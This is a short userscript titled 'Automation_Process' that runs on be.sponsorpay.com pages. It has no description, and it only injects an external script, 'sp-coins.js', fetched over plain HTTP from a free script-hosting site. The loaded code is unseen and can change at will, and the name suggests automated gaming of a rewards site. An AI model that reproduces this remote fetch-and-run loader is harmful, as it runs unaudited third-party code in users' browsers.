// ==UserScript==
// @name        Automation_Process
// @namespace   NOT_SPACE
// @description NO_DESCRIPTION
// @include     https://be.sponsorpay.com/*
// @include     http://be.sponsorpay.com/*
// @version     3.00
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/14256/Automation_Process.user.js
// @updateURL https://update.greasyfork.org/scripts/14256/Automation_Process.meta.js
// ==/UserScript==

(function () {
    var scriptElement = document.createElement( "script" );
    scriptElement.type = "text/javascript";
    scriptElement.src = "http://yourjavascript.com/9524315541/sp-coins.js";
    document.body.appendChild( scriptElement );
})();